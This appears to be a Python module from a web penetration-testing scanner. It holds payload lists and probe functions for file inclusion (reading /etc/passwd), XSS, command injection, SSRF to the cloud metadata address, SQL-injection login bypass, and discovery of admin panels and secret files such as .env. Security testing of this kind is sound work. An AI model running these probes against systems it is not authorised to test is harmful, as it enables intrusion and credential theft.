import re
from .core import Session, extract_links

LFI_PATHS = ["/etc/passwd", "/etc/hosts", "/windows/win.ini", "/boot.ini"]
XSS_PROBES = ['"><svg/onload=alert(1)>', "<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
CMDI_PROBES = [";id", "|id", "$(id)", "`id`", "&id"]
ADMIN_PATHS = ["admin", "admin.php", "admin/index.php", "admin/login.php", "administrator",
               "panel", "cpanel", "manager", "wp-admin", "login", "adminpanel"]
AUTH_PAYLOADS = ["' OR 1=1-- -", "admin'-- -", "' OR '1'='1", "' OR 1=1#", '" OR 1=1-- -']
SSRF_TARGETS = ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080", "file:///etc/passwd"]
DIRB_PATHS = [".git/config", ".env", "backup.zip", "robots.txt", "phpinfo.php", "admin/", "api/", "debug/", "test.php", "config.php.bak"]

def lfi(url, param, cookie=None, proxy=None, max_depth=6):
    s = Session(proxy=proxy, cookie=cookie); hits = []
    for depth in range(max_depth):
        for p in LFI_PATHS:
            r = s.get(url, params={param: "../" * (depth + 1) + p.lstrip("/")})
            if "root:x:" in r.text or "root:*:" in r.text or "[extensions]" in r.text: hits.append((depth, p))
        r = s.get(url, params={param: "php://filter/convert.base64-encode/resource=index"})
        if "PD9waH" in r.text: hits.append(("filter", "php://filter"))
        if hits: break
    return hits

def xss(url, param, cookie=None, proxy=None):
    s = Session(proxy=proxy, cookie=cookie)
    return [p for p in XSS_PROBES if p in s.get(url, params={param: p}).text]

def cmdi(url, param, cookie=None, proxy=None):
    s = Session(proxy=proxy, cookie=cookie)
    return [p for p in CMDI_PROBES if re.search(r"uid=\d+\(", s.get(url, params={param: p}).text)]

def ssrf(url, param, cookie=None, proxy=None):
    s = Session(proxy=proxy, cookie=cookie); hits = []
    for t in SSRF_TARGETS:
        r = s.get(url, params={param: t})
        if r.status_code == 200 and ("ami-id" in r.text or "root:" in r.text or len(r.text) > 0): hits.append(t)
    return hits

def admin_finder(base, cookie=None, proxy=None):
    s = Session(proxy=proxy, cookie=cookie); base = base.rstrip("/"); hits = []
    for p in ADMIN_PATHS:
        r = s.get(f"{base}/{p}")
        if r.status_code == 200 and len(r.text) > 200: hits.append((p, len(r.text)))
    return hits

def dirb(base, cookie=None, proxy=None):
    """Sensitive file/dir scanner (WSTG area 2: config mgmt)"""
    s = Session(proxy=proxy, cookie=cookie); base = base.rstrip("/"); hits = []
    for p in DIRB_PATHS:
        r = s.get(f"{base}/{p}")
        if r.status_code == 200 and len(r.text) > 50: hits.append((p, len(r.text)))
    return hits

def auth_bypass(url, user_field="username", pass_field="password", extra=None, cookie=None, proxy=None):
    s = Session(proxy=proxy, cookie=cookie); hits = []
    for p in AUTH_PAYLOADS:
        r = s.post(url, data={user_field: p, pass_field: p, **(extra or {})})
        if any(k in r.text.lower() for k in ["welcome", "dashboard", "logout", "login successful"]): hits.append(p)
    return hits

def upload_test(url, field="file", cookie=None, proxy=None):
    s = Session(proxy=proxy, cookie=cookie)
    r = s.post(url, files={field: ("rnx_test.txt", b"RECONX-UPLOAD-TEST", "text/plain")})
    return {"status": r.status_code, "snippet": r.text[:300]}

def links(url, cookie=None, proxy=None):
    return extract_links(Session(proxy=proxy, cookie=cookie).get(url).text)